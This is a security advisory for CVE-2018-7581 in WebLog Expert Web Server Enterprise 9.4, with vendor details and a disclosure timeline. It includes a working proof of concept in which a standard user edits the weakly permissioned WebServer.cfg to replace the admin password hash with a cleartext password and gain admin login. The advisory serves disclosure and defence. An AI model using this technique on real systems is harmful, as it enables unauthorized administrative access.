@@ -1,0 +1,91 @@
+[+] Credits: John Page (aka hyp3rlinx)		
+[+] Website: hyp3rlinx.altervista.org
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/WEBLOG-EXPERT-WEB-SERVER-ENTERPRISE-v9.4-AUTHENTICATION-BYPASS.txt
+[+] ISR: Apparition Security          
+ 
+
+Vendor:
+========
+www.weblogexpert.com
+
+
+Product:
+========
+WebLog Expert Web Server Enterprise v9.4
+
+WebLog Expert is a fast and powerful access log analyzer. It will give you information about your site's visitors:
+activity statistics, accessed files, paths through the site, information about referring pages, search engines, browsers,
+operating systems, and more. The program produces easy-to-read reports that include both text information (tables) and charts.
+
+
+
+Vulnerability Type:
+===================
+Authentication Bypass
+
+
+
+CVE Reference:
+==============
+CVE-2018-7581
+
+
+
+Security Issue:
+================
+The "WebServer.cfg" under "ProgramData\WebLog Expert\WebServer\" used by WebLog Expert Web Server Enterprise 9.4
+has weak permissions (BUILTIN\Users:(ID)C), which allows local users to set a cleartext password and login as admin.
+
+A standard non Windows Administrator user can edit the 'WebServer.cfg' file under "C:\ProgramData\WebLog Expert\WebServer"
+set to a cleartext password and login as admin.
+
+e.g.
+
+C:\ProgramData\WebLog Expert\WebServer>cacls * | more
+C:\ProgramData\WebLog Expert\WebServer\WebServer.cfg BUILTIN\Users:(ID)C         
+                                                      BUILTIN\Administrators:(ID)C
+                                                      NT AUTHORITY\SYSTEM:(ID)F
+                                                      BUILTIN\Administrators:(ID)F
+
+
+Exploit/POC:
+=============
+Login as a 'Standard' Windows user
+Comment out the Admin hashed password using ';' then add any cleartext password as follows.
+
+[User:admin]
+Password=1234
+;PasswordHash=3413C538CE5234FB194E82AE1F3954FD2BC848C0
+bAllProfiles=1
+
+Now login in as Admin! :)
+
+
+
+Network Access:
+===============
+Local
+
+
+
+Severity:
+=========
+Medium
+
+
+
+Disclosure Timeline:
+=============================
+Vendor Notification: March 1, 2018
+No replies from previous attempts
+March 7, 2018 : Public Disclosure
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere. All content (c).
